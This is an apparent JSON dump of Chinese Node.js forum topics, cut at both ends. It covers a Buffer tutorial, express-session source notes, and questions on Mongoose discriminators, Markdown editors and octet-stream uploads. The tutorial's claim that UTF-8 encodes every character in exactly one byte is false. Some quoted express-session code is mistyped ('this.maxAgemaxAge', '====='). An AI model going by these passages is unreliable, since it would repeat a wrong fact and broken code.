charcodeat(0)。这时控制台会显示出数字76，这是字符“L”的数字表示。但是计算机又是如何知道每个字符表示的确切数字呢?它怎么知道用76来表示L?</p>\n<h2>字符集</h2>\n<p>字符集已经定义好的表示每个字符的确切数字的规则。我们对这些规则有不同的定义，最流行的包括Unicode和ASCII。JavaScript可以很好地处理Unicode字符集。所以，浏览器中的Unicode规定<strong>76</strong>应该表示<strong>L</strong>。</p>\n<p>我们已经看到计算机是如何用数字表示字符的。转换成数字之后计算机再把76转换它的二进制表示。</p>\n<h2>字符编码</h2>\n<p>正如有一些字符集规则定义数字应该怎么样表示字符一样，也有一些规则定义了数字应该如何在二进制文件中表示。具体来说，就是用多少位来表示数字。这叫做字符编码。</p>\n<p>字符编码的一个规则是<strong>UTF-8</strong>。UTF-8声明字符应该以<strong>bytes</strong>编码。一个<strong>byte</strong>是8位（bit）的集合 —— 8个1和0。因此，UTF-8规定应该使用8个1和0来表示二进制中任何字符。</p>\n<p>之前的例子提到，数字12用二进制表示为 <strong>1100</strong>，但是用UTF-8表示应该是8位才对。所以UTF-8规定，计算机需要在不满8位的二进制数字左边添加更多的位，以使其成为一个字节。所以12应该存储为<strong>00001100</strong>。</p>\n<p>因此 76 在UTF-8规则下存储表示为：<strong>01001100</strong></p>\n<p>这就是计算机在二进制文件中存储字符串或字符的方式。同样，计算机也规定了图片和视频应该如何转换、编码和存储在二进制文件中的规则。计算机将所有数据类型存储在二进制文件中。</p>\n<p>现在我们了解了什么是二进制数据，接下来我们介绍一下什么是二进制数据流。</p>\n<h2>流</h2>\n<p>js中的Stream只是表示随着时间的推移从一个点移动到另一个点的数据序列。整个概念是，你有大量的数据要处理，但是你不需要等到所有的数据都可用后才开始处理它。基本上，这个大数据被分解并以块的形式发送。因此，从Buffer的原始定义来看，这仅仅意味着二进制数据正在文件系统中移动。例如，将存储在file1.txt中的文本移动到file2.txt。</p>\n<p>但是Buffer究竟如何帮助我们在流与二进制数据进行交互或操作呢?Buffer到底是什么?</p>\n<h2>Buffer</h2>\n<p>我们已经提到，数据流是数据从一个点移动到另一个点，但是它们究竟是如何移动的呢?</p>\n<p>通常数据的移动是为了处理或读取数据，并根据数据做出决策。在这个过程中，可能需要数据到达一个最小量或者最大量才能进行处理。因此，如果数据到达的速度快于进程消耗数据的速度，那么多余的数据需要在某个地方的等待来处理。另一方面，如果进程消耗数据的速度快于数据到达的速度，那么早到达的少数数据需要等待一定数量的数据到达，然后再发送出去进行处理。</p>\n<p>那个“等候区”就是<strong>Buffer</strong>!它是计算机中的一个小物理位置，通常位于RAM中，数据在RAM中被临时收集、等待，并最终发在流过程中送出去进行处理。</p>\n<p>我们可以把整个stream和buffer过程看做一个汽车站。在某个汽车站，汽车直到有一定数量的乘客或者是一个特殊的时间才可以发车。此外，乘客可能在不同的时间以不同的速度到达。无论是旅客还是汽车站都不能控制旅客到达车站的时间。提前到达的乘客需要等汽车发车。当有些乘客到达时，乘客已经满员或者汽车已经离开，需要等待下一辆汽车。</p>\n<p>无论什么情况，总有一个等待的地方。这就是Node.js的Buffer! js不能控制数据到达的速度或时间，也不能控制流的速度。它只能决定何时发送数据。如果还没有到时间，Node.js将把它们放在buffer中，即RAM中的一个小位置，直到将它们发送出去进行处理为止。</p>\n<p>一个典型的例子是，当你在观看流媒体视频时，可以看到buffer在工作。如果你的互联网连接足够快，流的速度将足够快，可以立即填满Buffer并发送出去进行处理，然后再填入另一个Buffer，然后发送出去，再发送一个，再发送一个，直到流完成为止。</p>\n<p>但是如果你的连接很慢，在处理了第一组到达的数据后，视频会被卡主，这意味着程序正在收集更多的数据，或者等待更多的数据到达。当buffer被填满并处理后，播放器会继续播放视频。在播放的同时，更多的数据将继续到达并在buffer中等待。</p>\n<h2>与Buffer交互</h2>\n<p>Node.js在处理流期间会自动创建buffer，我们也可以通过Nodejs提供的API自己创建buffer。根据你的需求，这里有几种不同的方法可以创建buffer。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; Create an empty buffer of size 10.\n&#x2F;&#x2F; A buffer that only can accommodate 10 bytes\nconst buf1 = Buffer.alloc(10)\n\n&#x2F;&#x2F; Create a buffer with content\nconst buf2 = Buffer.from(&quot;hello buffer&quot;)\n</code></pre><p>当创建成功buffer后，你就可以开始和它进行交互了。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 查看buffer的结构\nbuf1.toJSON()\n&#x2F;&#x2F; { type: &#x27;Buffer&#x27;, data: [ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] }\n\nbuf2.toJSON()\n&#x2F;&#x2F;{ type: &#x27;Buffer&#x27;,data: [ 104, 101, 108, 108, 111, 32, 98, 117, 102, 102, 101, 114 ]}\n\nbuf1.length &#x2F;&#x2F; 10\nbuf2.length &#x2F;&#x2F; 12\n\n&#x2F;&#x2F; 写操作\nbuf1.write(&quot;Buffer really rocks!&quot;)\n\n&#x2F;&#x2F; decode\nbuf1.toString() &#x2F;&#x2F; &#x27;Buffer rea&#x27;\n&#x2F;&#x2F; 因为buf1创建时只分配了10byte的空间。超过的将不会被存储。\n</code></pre><p>更多的交互API，可以查看<a href=\"https://nodejs.org/dist/latest-v8.x/docs/api/buffer.html#buffer_buffer\">官方文档</a>，</p>\n<p>希望这篇介绍能帮助您更好地理解Node.js Buffer。</p>\n</div>","title":"彻底理解Node.js中的Buffer","last_reply_at":"2019-04-22T14:00:13.077Z","good":false,"top":false,"reply_count":0,"visit_count":686,"create_at":"2019-04-22T14:00:13.077Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5c0a929c15a4d545e3f4c5d6","author_id":"5bc9f0ca9545eaf107b9ccdd","tab":"ask","content":"<div class=\"markdown-text\"><p>如何学习</p>\n</div>","title":"如何学习vue框架","last_reply_at":"2019-04-22T13:41:44.949Z","good":false,"top":false,"reply_count":24,"visit_count":2428,"create_at":"2018-12-07T15:32:44.120Z","author":{"loginname":"hhffhh","avatar_url":"https://avatars0.githubusercontent.com/u/3991376?v=4&s=120"}},{"id":"5cbab70737faec0ce1d03f6c","author_id":"5b4d997faef62f1b0f9e03be","tab":"share","content":"<div class=\"markdown-text\"><h2>背景</h2>\n<p>这几天抽时间深入阅读了一下 Express-session 中间件的源码，做个总结。</p>\n<h2>Cookie</h2>\n<p>Cookie 是网站为了辨别用户身份、进行 Session 跟踪而储存在用户本地终端上的数据。Cookie有如下属性：</p>\n<ul>\n<li>Cookie-name &amp; Cookie-value ：想要存储的键值对，比如 <code>SessionId:xxx</code>。</li>\n<li>Expires ：Cookie 存储在浏览器的最大时间，需要注意的是，这里的时间是相对于客户端时间而不是服务端时间。</li>\n<li>Max-age ：等待 Cookie 过期的秒数。与 Expires 同时存在的时候，优先级高于 Expires。</li>\n<li>Domain ：属性定义可访问该 Cookie 的域名，对一些大的网站，如果希望 Cookie 可以在子网站中共享，可以使用该属性。例如设置 Domain 为 <code>.bigsite.com</code>,则<code>sub1.bigsite.com</code>和<code>sub2.bigsite.com</code>都可以访问已保存在客户端的<code>cookie</code>，这时还需要将 Path 设置为<code>/</code>。</li>\n<li>Path ：可以访问 Cookie的页面的路径，缺省状态下 Path 为产生 Cookie 时的路径，此时 Cookie。 可以被该路径以及其子路径下的页面访问；可以将 Path 设置为 <code>/</code> ，使 Cookie 可以被网站下所有页面访问。</li>\n<li>Secure ：Secure 只是一个标记而没有值。只有当一个请求通过 SSL 或 HTTPS 创建时，包含 Secure 选项的 Cookie 才能被发送至服务器。</li>\n<li>HttpOnly ：只允许 Cookie 通过 Http 方式来访问，防止脚本攻击。</li>\n</ul>\n<p>Cookie 也有一些不足：</p>\n<ul>\n<li>Http 请求的 Cookie 是明文传递的,所以安全性会有问题。</li>\n<li>Cookie 会附加在 Http 请求中，加大了请求的流量。</li>\n<li>Cookie 有大小限制,无法满足复杂的存储。</li>\n</ul>\n<h2>cookie 与 session 交互</h2>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/20/16a393e758224bf9?w=1632&amp;h=688&amp;f=png&amp;s=92700\" alt></p>\n<p>一次请求的流程大概如下：</p>\n<ul>\n<li>客户端初次向服务端发出请求，此时 Cookie 内还没有 SessionId。</li>\n<li>服务端接收到 Request ，解析出 Request Header 没有对应的 SessionId ,于是服务端初始化一个 Session,并将 Session 存放到对应的容器里，如文件、Redis、内存中。</li>\n<li>请求返回时，Response.header 中写入 <code>set-cookie</code> 传入 SessioinId。</li>\n<li>客户端接收到 <code>set-cookie</code> 指令，将 Cookie 的内容存放在客户端。</li>\n<li>再次请求时,请求的 Cookie 中就会带有该用户会话的 SessionId。</li>\n</ul>\n<h2>源码笔记</h2>\n<p>express-session 包主要由index.js、cookie.js、memory.js、session.js、store.js组成。</p>\n<h3>cookie.js</h3>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; cookie构造函数，默认 path、maxAge、httpOnly 的值，如果有传入的 Options ，则覆盖默认配置\n\nconst Cookie = module.exports = function Cookie(options) {\n  this.path = &#x27;&#x2F;&#x27;;\n  this.maxAge = null;\n  this.httpOnly = true;\n  if (options) merge(this, options);\n  this.originalMaxAge = undefined == this.originalMaxAge\n    ? this.maxAgemaxAge\n    : this.originalMaxAge;\n};\n\n&#x2F;&#x2F;封装了 cookie 的方法：set expires、get expires 、set maxAge、get maxAge、get data、serialize、toJSON\n\nCookie.prototype = {\n    ······\n};\n</code></pre><h3>store.js</h3>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; store 对象用于顾名思义与 session 存储有关\n&#x2F;&#x2F; store 对象是一个抽象类，封装了一些抽象函数，需要子类去具体实现。\n\n&#x2F;&#x2F; 重新获取 store ，先销毁再获取，子类需要实现 destroy 销毁函数。\nStore.prototype.regenerate = function (req, fn) {\n  const self = this;\n  this.destroy(req.sessionID, (err) =&gt; {\n    self.generate(req);\n    fn(err);\n  });\n};\n\n&#x2F;&#x2F; 根据 sid 加载 session\nStore.prototype.load = function (sid, fn) {\n  const self = this;\n  this.get(sid, (err, sess) =&gt; {\n    if (err) return fn(err);\n    if (!sess) return fn();\n    const req = { sessionID: sid, sessionStore: self };\n    fn(null, self.createSession(req, sess));\n  });\n};\n\n&#x2F;&#x2F;该函数用于创建session\n&#x2F;&#x2F;调用 Session() 在 request 对象上构造 session \n&#x2F;&#x2F;为什么创建 session 的函数要放在 store 里？\nStore.prototype.createSession = function (req, sess) {\n  let expires = sess.cookie.expires\n    , orig = sess.cookie.originalMaxAge;\n  sess.cookie = new Cookie(sess.cookie);\n  if (typeof expires === &#x27;string&#x27;) sess.cookie.expires = new Date(expires);\n  sess.cookie.originalMaxAge = orig;\n  req.session = new Session(req, sess);\n  return req.session;\n};\n</code></pre><h3>session.js</h3>\n<pre class=\"prettyprint\"><code>module.exports = Session;\n\n&#x2F;&#x2F; Session构造函数，根据 request 与 data 参数构造 session 对象\nfunction Session(req, data) {\n  Object.defineProperty(this, &#x27;req&#x27;, { value: req });\n  Object.defineProperty(this, &#x27;id&#x27;, { value: req.sessionID });\n\n  if (typeof data ===== &#x27;object&#x27; &amp;&amp; data !== null) {\n    &#x2F;&#x2F; merge data into this, ignoring prototype properties\n    for (const prop in data) {\n      if (!(prop in this)) {\n        this[prop] = data[prop];\n      }\n    }\n  }\n}\n</code></pre><h3>memory.js</h3>\n<pre class=\"prettyprint\"><code>module.exports = MemoryStore;\n\n&#x2F;&#x2F; 继承了 store 的内存仓库\nfunction MemoryStore() {\n  Store.call(this);\n  this.sessions = Object.create(null);\n}\n\n\nutil.inherits(MemoryStore, Store);\n\n&#x2F;&#x2F; 获取内存中的所有 session 记录\nMemoryStore.prototype.all = function all(callback) {\n  const sessionIds = Object.keys(this.sessions);\n  const sessions = Object.create(null);\n\n  for (let i = 0; i &lt; sessionIds.length; i++) {\n    const sessionId = sessionIds[i];\n    const session = getSession.call(this, sessionId);\n\n    if (session) {\n      sessions[sessionId] = session;\n    }\n  }\n\n  callback &amp;&amp; defer(callback, null, sessions);\n};\n\n&#x2F;&#x2F; 清空内存记录\nMemoryStore.prototype.clear = function clear(callback) {\n  this.sessions = Object.create(null);\n  callback &amp;&amp; defer(callback);\n};\n\n&#x2F;&#x2F; 根据 sessionId 销毁对应的 session 信息\nMemoryStore.prototype.destroy = function destroy(sessionId, callback) {\n  delete this.sessions[sessionId];\n  callback &amp;&amp; defer(callback);\n};\n\n\n&#x2F;&#x2F; 根据 sessionId 返回 session\nMemoryStore.prototype.get = function get(sessionId, callback) {\n  defer(callback, null, getSession.call(this, sessionId));\n};\n\n&#x2F;&#x2F; 写入 session\nMemoryStore.prototype.set = function set(sessionId, session, callback) {\n  this.sessions[sessionId] = JSON.stringify(session);\n  callback &amp;&amp; defer(callback);\n};\n\n\n&#x2F;&#x2F; 获取有效的 session\nMemoryStore.prototype.length = function length(callback) {\n  this.all((err, sessions) =&gt; {\n    if (err) return callback(err);\n    callback(null, Object.keys(sessions).length);\n  });\n};\n\n&#x2F;&#x2F; 更新 session 的 cookie 信息\nMemoryStore.prototype.touch = function touch(sessionId, session, callback) {\n  const currentSession = getSession.call(this, sessionId);\n\n  if (currentSession) {\n    &#x2F;&#x2F; update expiration\n    currentSession.cookie = session.cookie;\n    this.sessions[sessionId] = JSON.stringify(currentSession);\n  }\n\n  callback &amp;&amp; defer(callback);\n};\n</code></pre><h3>index.js</h3>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; index 文件为了读起来清晰通顺，我只提取了 session 中间件的主要逻辑大部分的函数定义我都去除了，具体某个函数不了解可以自己看详细函数实现。\n\nexports = module.exports = session;\n\nexports.Store = Store;\nexports.Cookie = Cookie;\nexports.Session = Session;\nexports.MemoryStore = MemoryStore;\n\n\nfunction session(options) {\n\n  &#x2F;&#x2F;根据 option 赋值\n  const opts = options || {};\n  const cookieOptions = opts.cookie || {};\n  const generateId = opts.genid || generateSessionId;\n  const name = opts.name || opts.key || &#x27;connect.sid&#x27;;\n  const store = opts.store || new MemoryStore();\n  const trustProxy = opts.proxy;\n  let resaveSession = opts.resave;\n  const rollingSessions = Boolean(opts.rolling);\n  let saveUninitializedSession = opts.saveUninitialized;\n  let secret = opts.secret;\n\n  &#x2F;&#x2F; 定义 store的 generate 函数（原来 store.regenerate 的 generate()在这里定义。。为啥不在 store 文件里定义呢？）\n  &#x2F;&#x2F; request 对象下挂载 sessionId 与 cookie 对象\n  store.generate = function (req) {\n    req.sessionID = generateId(req);\n    req.session = new Session(req);\n    req.session.cookie = new Cookie(cookieOptions);\n\n    if (cookieOptions.secure === &#x27;auto&#x27;) {\n      req.session.cookie.secure = issecure(req, trustProxy);\n    }\n  };\n\n  const storeImplementsTouch = typeof store.touch === &#x27;function&#x27;;\n\n  &#x2F;&#x2F;注册 session store 的监听  \n  let storeReady = true;\n  store.on(&#x27;disconnect&#x27;, () =&gt; {\n    storeReady = false;\n  });\n  store.on(&#x27;connect&#x27;, () =&gt; {\n    storeReady = true;\n  });\n\n\n  return function session(req, res, next) {\n    &#x2F;&#x2F; self-awareness\n    if (req.session) {\n      next();\n      return;\n    }\n\n    &#x2F;&#x2F; Handle connection as if there is no session if\n    &#x2F;&#x2F; the store has temporarily disconnected etc\n    if (!storeReady) {\n      debug(&#x27;store is disconnected&#x27;);\n      next();\n      return;\n    }\n\n    &#x2F;&#x2F; pathname mismatch\n    const originalPath = parseUrl.original(req).pathname;\n    if (originalPath.indexOf(cookieOptions.path || &#x27;&#x2F;&#x27;) !== 0) return next();\n\n    &#x2F;&#x2F; ensure a secret is available or bail\n    if (!secret &amp;&amp; !req.secret) {\n      next(new Error(&#x27;secret option required for sessions&#x27;));\n      return;\n    }\n\n    &#x2F;&#x2F; backwards compatibility for signed cookies\n    &#x2F;&#x2F; req.secret is passed from the cookie parser middleware\n    const secrets = secret || [req.secret];\n\n    let originalHash;\n    let originalId;\n    let savedHash;\n    let touched = false;\n\n    &#x2F;&#x2F; expose store\n    req.sessionStore = store;\n\n    &#x2F;&#x2F; get the session ID from the cookie\n    const cookieId = req.sessionID = getcookie(req, name, secrets);\n\n    &#x2F;&#x2F; 绑定监听事件，程序改写 res.header 时写入 set-cookie\n    onHeaders(res, () =&gt; {\n      if (!req.session) {\n        debug(&#x27;no session&#x27;);\n        return;\n      }\n\n      if (!shouldSetCookie(req)) {\n        return;\n      }\n\n      &#x2F;&#x2F; only send secure cookies via https\n      if (req.session.cookie.secure &amp;&amp; !issecure(req, trustProxy)) {\n        debug(&#x27;not secured&#x27;);\n        return;\n      }\n  \n      if (!touched) {\n        &#x2F;&#x2F; 重新设置 cookie 的 maxAge\n        req.session.touch();\n        touched = true;\n      }\n\n      &#x2F;&#x2F;将 set-cookie 写入 header\n      setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);\n    });\n\n    &#x2F;&#x2F; 代理 res.end 来提交 session 到 session store \n    &#x2F;&#x2F; 覆写了 res.end 也解决了我最开始提出的为什么在请求的最后更新 session 的疑问。\n    const _end = res.end;\n    const _write = res.write;\n    let ended = false;\n    res.end = function end(chunk, encoding) {\n      if (ended) {\n        return false;\n      }\n\n      ended = true;\n\n      let ret;\n      let sync = true;\n\n      &#x2F;&#x2F;判断是否需要销毁库存中的对应 session 信息\n      if (shouldDestroy(req)) {\n        &#x2F;&#x2F; destroy session\n        debug(&#x27;destroying&#x27;);\n        store.destroy(req.sessionID, (err) =&gt; {\n          if (err) {\n            defer(next, err);\n          }\n\n          debug(&#x27;destroyed&#x27;);\n          writeend();\n        });\n\n        return writetop();\n      }\n\n      &#x2F;&#x2F; no session to save\n      if (!req.session) {\n        debug(&#x27;no session&#x27;);\n        return _end.call(res, chunk, encoding);\n      }\n\n      if (!touched) {\n        &#x2F;&#x2F; touch session\n        req.session.touch();\n        touched = true;\n      } \n\n      &#x2F;&#x2F;判断应该将 req.session 存入 store 中\n      if (shouldSave(req)) {\n        req.session.save((err) =&gt; {\n          if (err) {\n            defer(next, err);\n          }\n\n          writeend();\n        });\n\n        return writetop();\n      } else if (storeImplementsTouch &amp;&amp; shouldTouch(req)) {\n       \n        &#x2F;&#x2F;刷新 store 内的 session 信息\n        debug(&#x27;touching&#x27;);\n        store.touch(req.sessionID, req.session, (err) =&gt; {\n          if (err) {\n            defer(next, err);\n          }\n\n          debug(&#x27;touched&#x27;);\n          writeend();\n        });\n\n        return writetop();\n      }\n\n      return _end.call(res, chunk, encoding);\n    };\n\n    &#x2F;&#x2F; session 不存在重新获取 session\n    if (!req.sessionID) {\n      debug(&#x27;no SID sent, generating session&#x27;);\n      generate();\n      next();\n      return;\n    }\n\n    &#x2F;&#x2F; 获取 store 中的 session 对象\n    debug(&#x27;fetching %s&#x27;, req.sessionID);\n    store.get(req.sessionID, (err, sess) =&gt; {\n      &#x2F;&#x2F; error handling\n      if (err) {\n        debug(&#x27;error %j&#x27;, err);\n\n        if (err.code !== &#x27;ENOENT&#x27;) {\n          next(err);\n          return;\n        }\n        generate();\n      } else if (!sess) {\n        debug(&#x27;no session found&#x27;);\n        generate();\n      } else {\n        debug(&#x27;session found&#x27;);\n        store.createSession(req, sess);\n        originalId = req.sessionID;\n        originalHash = hash(sess);\n\n        if (!resaveSession) {\n          savedHash = originalHash;\n        }\n\n        &#x2F;&#x2F;重写res.session的 load() 与 save()\n        wrapmethods(req.session);\n      }\n\n      next();\n    });\n  };\n}\n</code></pre></div>","title":"Express Session 源码阅读笔记","last_reply_at":"2019-04-22T10:32:33.235Z","good":false,"top":false,"reply_count":2,"visit_count":738,"create_at":"2019-04-20T06:07:03.604Z","author":{"loginname":"guojingkang","avatar_url":"https://avatars0.githubusercontent.com/u/39728127?v=4&s=120"}},{"id":"5cb99e46a86ae80ce64b135e","author_id":"5adecaa3a86ec1f308ec2480","tab":"ask","content":"<div class=\"markdown-text\"><p>传统的 markdown 编辑器都是两个页面，左边编辑，右边预览效果。</p>\n<p>偶然发现 typora 和 语雀 这两个编辑器也可以写 markdown，但是是在一个页面上书写的，可见即所得。</p>\n<p>想了解下实现原理是什么？</p>\n</div>","title":"来场头脑风暴","last_reply_at":"2019-04-22T07:42:42.931Z","good":false,"top":false,"reply_count":2,"visit_count":1122,"create_at":"2019-04-19T10:09:10.014Z","author":{"loginname":"dkvirus","avatar_url":"https://avatars1.githubusercontent.com/u/29170168?v=4&s=120"}},{"id":"5cbd6fbf37faec0ce1d04831","author_id":"52d491ffe20b7c82147b2214","tab":"ask","content":"<div class=\"markdown-text\"><h4>正常的 Mongoose 里 不使用 Discriminators 的写法：</h4>\n<pre class=\"prettyprint language-js\"><code>&gt; models&#x2F;book.js\n\n&#x2F;&#x2F; Define our Book schema\nconst BookSchema = new mongoose.Schema(\n  {\n    title: { type: String, required: true },\n    author: { type: String, required: true },\n    release_date: { type: Date, required: true },\n  }\n);\n\n&#x2F;&#x2F; Create a model from our schema\nmodule.exports = mongoose.model(&#x27;Book&#x27;, BookSchema);\n</code></pre><pre class=\"prettyprint language-js\"><code>&gt; models&#x2F;movie.js\n\nconst MovieSchema = new mongoose.Schema(\n  {\n    title: { type: String, required: true },\n    director: { type: String, required: true },\n    release_date: { type: Date, required: true },\n  }\n);\n\nmodule.exports = mongoose.model(&#x27;Movie&#x27;, MovieSchema);\n</code></pre><h4>使用 Discriminators 的写法：</h4>\n<pre class=\"prettyprint language-js\"><code>&gt; models&#x2F;book.js\n\nconst baseOptions = {\n  discriminatorKey: &#x27;itemtype&#x27;, &#x2F;&#x2F; our discriminator key, could be anything\n  collection: &#x27;items&#x27;, &#x2F;&#x2F; the name of our collection\n};\n\nconst Base = mongoose.model(&#x27;Base&#x27;, new mongoose.Schema({\n      title: { type: String, required: true },\n      date_added: { type: Date, required: true },\n      redo: { type: Boolean, required: false },\n    }, baseOptions,\n  ),\n);\n\nmodule.exports = mongoose.model(&#x27;Base&#x27;);\n</code></pre><pre class=\"prettyprint language-js\"><code>&gt; models&#x2F;book.js\n\nconst Base = require(&#x27;.&#x2F;base&#x27;); &#x2F;&#x2F; we have to make sure our Book schema is aware of the Base schema\n\nconst Book = Base.discriminator(&#x27;Book&#x27;, new mongoose.Schema({\n    author: { type: String, required: true },\n  }),\n);\n\nmodule.exports = mongoose.model(&#x27;Book&#x27;);\n</code></pre><pre class=\"prettyprint language-js\"><code>&gt; models&#x2F;movie.js\n\nconst Base = require(&#x27;.&#x2F;base&#x27;);\n\nconst Movie = Base.discriminator(&#x27;Movie&#x27;, new mongoose.Schema({\n    director: { type: String, required: true },\n  }),\n);\n\nmodule.exports = mongoose.model(&#x27;Movie&#x27;);\n</code></pre><h4>上面的例子在 egg-mongoose 里这样写：</h4>\n<pre class=\"prettyprint language-js\"><code>&gt; {app_root}&#x2F;app&#x2F;model&#x2F;base.js\n\nmodule.exports = app =&gt; {\n  const mongoose = app.mongoose;\n  const Schema = mongoose.Schema;\n\n  const baseOptions = {\n  discriminatorKey: &#x27;itemtype&#x27;, &#x2F;&#x2F; our discriminator key, could be anything\n  collection: &#x27;items&#x27;, &#x2F;&#x2F; the name of our collection\n  };\n\nconst BaseScheme = new Schema({\n      title: { type: String, required: true },\n      date_added: { type: Date, required: true },\n      redo: { type: Boolean, required: false },\n    }, baseOptions);\n\n  return mongoose.model(&#x27;Base&#x27;, BaseScheme);\n};\n</code></pre><pre class=\"prettyprint language-js\"><code>&gt; {app_root}&#x2F;app&#x2F;model&#x2F;book.js\n\nconst Base = require(&#x27;.&#x2F;base&#x27;);\n\nmodule.exports = app =&gt; {\n  const mongoose = app.mongoose;\n  const Schema = mongoose.Schema;\n  \n  const BookSchema = new Schema({\n    author: { type: String, required: true },\n  });\n  \n  return Base.discriminator(&#x27;Book&#x27;, BookSchema);\n};\n</code></pre><h4>这样做会报错，提示：</h4>\n<pre class=\"prettyprint language-js\"><code>ERROR 30161 nodejs.TypeError: Base.discriminator is not a function\n</code></pre><h4>请问在 egg-mongoose 中在保持 model 分离的前提下如何实现上述功能？</h4>\n<h4>其他</h4>\n<p>上面例子的代码源自 <a href=\"https://dev.to/helenasometimes/getting-started-with-mongoose-discriminators-in-expressjs--22m9\">Getting started with Mongoose discriminators in Express.js</a></p>\n</div>","title":"egg-mongoose 的写法怎么实现 Discriminators？","last_reply_at":"2019-04-22T07:39:43.630Z","good":false,"top":false,"reply_count":0,"visit_count":520,"create_at":"2019-04-22T07:39:43.630Z","author":{"loginname":"VincentSit","avatar_url":"https://avatars0.githubusercontent.com/u/4084679?v=4&s=120"}},{"id":"5cbbec7237faec0ce1d04245","author_id":"57d216e13d3520a5387c2b53","tab":"ask","content":"<div class=\"markdown-text\"><p>RT!</p>\n</div>","title":"大家好，我问一下。node有什么比较好的开源影视视频项目吗","last_reply_at":"2019-04-22T04:56:52.490Z","good":false,"top":false,"reply_count":2,"visit_count":1170,"create_at":"2019-04-21T04:07:14.502Z","author":{"loginname":"a69694510","avatar_url":"https://avatars1.githubusercontent.com/u/20507053?v=4&s=120"}},{"id":"5cbd405ea86ae80ce64b1c82","author_id":"5520a425ce156cc206687c5c","tab":"share","content":"<div class=\"markdown-text\"><p>在很多时候，我们需要定位一个文件的位置，通过不断向上寻找父目录，来找到。比如说，找到node项目根目录，我们就要从当前目录，不停地向上寻找到一个有着package.json的目录。</p>\n<p><a href=\"https://github.com/zhangkaiyulw/find-dominant-file\">find-dominant-file</a> 专门解决这个问题，它没有任何依赖项，它不仅支持js，也支持ts。我在多个项目中使用了这个小工具。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; TypeScript\nimport findDominantFile from &#x27;find-dominant-file&#x27;;\n&#x2F;&#x2F; JavaScript\nconst findDominantFile = require(&#x27;find-dominant-file&#x27;);\n</code></pre></div>","title":"推荐大家一个function小工具","last_reply_at":"2019-04-22T04:17:34.799Z","good":false,"top":false,"reply_count":0,"visit_count":624,"create_at":"2019-04-22T04:17:34.799Z","author":{"loginname":"cheunghy","avatar_url":"https://avatars0.githubusercontent.com/u/3055936?v=4&s=120"}},{"id":"5ba8ad0a15e4fd1923f489ff","author_id":"5520a425ce156cc206687c5c","tab":"share","content":"<div class=\"markdown-text\"><p>首先，确保node 8以上已经安装，建议用10。\n确保已经安装mongodb并后台启动。</p>\n<p>安装amur</p>\n<pre class=\"prettyprint language- bash\"><code>npm install amur -g\n</code></pre><p>创建项目和生成API</p>\n<pre class=\"prettyprint language-bash\"><code># 创建一个新项目\nmkdir ~&#x2F;Desktop&#x2F;demo\ncd ~&#x2F;Desktop&#x2F;demo\namur app . # 这里有一个点\n\n# 不需要上传型字段的话，这一段不要执行。你需要申请个AliOSS云存储。\n# 再没有Uploader的情况下，接下来的命令，请删掉上传型字段。\n# 这里创建一个Uploader\namur uploader FileUploader extends AliOSSUploader bucket=your-bucket \\\n  region=oss-cn-shanghai accessKeySecret=yourSecret \\\n  accessKeyId=yourId\n  \n# Note about the contact schema, it&#x27;s should be copied than referenced.\namur resource User &#x27;email:String!$&#x27; &#x27;name:String!$&#x27; &#x27;gender:Enum{male,female}!&#x27; \\\n  &#x27;age:Int&gt;=0&lt;=100!&#x27; avatar:FileUploader orders:[Order]:user contacts:[contactSchema] \\\n  notificationSettings:{ pushNotification:Boolean email:Boolean sms:Boolean }\n\namur schema Contact name:String phoneNo:String address:String\n# Note here:\n# we save category on product side, it&#x27;s because product has several categories,\n# but a category has a lot of products. We take the benefit of mongoDB.\namur resource Product &#x27;name:String!&#x27; &#x27;description:String!&#x27; &#x27;price:Float&gt;=0!&#x27; \\\n  &#x27;quantityAvailable:Int&gt;=0!&#x27; categories:[Category] images:[FileUploader] \\\n  comments:[Comment]:Order.comment.product coverImage:FileUploader\n# We can add a &#x27;countable&#x27; here.\namur resource Category &#x27;name:String!$&#x27; &#x27;description:String!&#x27; \\\n  products:[Product]:categories parentCategory:Category \\\n  childCategories:[Category]:parentCategory\n\n# Note we need to write custom code to verify if the quality is valid\n# We also need to add a custom getter which calculates the price\namur resource Order &#x27;product:Product!&#x27; &#x27;user:User!&#x27; comment:Comment \\\n  &#x27;quality:Int&gt;=0&#x27; contact:contactSchema\n\namur resource Comment &#x27;content:String!&#x27; order:Order:comment images:[FileUploader] \\\n  user:User:Order.user.comment product:Product:Order.product.comment\n</code></pre><p>最后，npm start即可打开浏览器，到http://localhost:4000体验GraphQL API啦</p>\n</div>","title":"Tutorial：五分钟做一套GraphQL API，不写代码","last_reply_at":"2019-04-22T04:13:36.615Z","good":false,"top":false,"reply_count":8,"visit_count":1925,"create_at":"2018-09-24T09:23:22.355Z","author":{"loginname":"cheunghy","avatar_url":"https://avatars0.githubusercontent.com/u/3055936?v=4&s=120"}},{"id":"5cbaee5aa86ae80ce64b1621","author_id":"5cbae245a86ae80ce64b1609","tab":"ask","content":"<div class=\"markdown-text\"><p>最近遇到一个需求，大文件上传，一开始使用FormData的格式上传，后台(<strong>go</strong>大佬)嫌弃解释时间太长，要求换成 <strong>octet-stream</strong>的格式？！\n我懵了许久，以前一直没听说过啊，在网上也没有查到能帮助的资料，然后前端各种修改，最终以前端获取到的 <em>File</em> 对象，直接丢到</p>\n<pre class=\"prettyprint\"><code>$.ajax({\n\tdata:File,\n\tcontentType:flase,\n\tprocessData:false\n\t}) 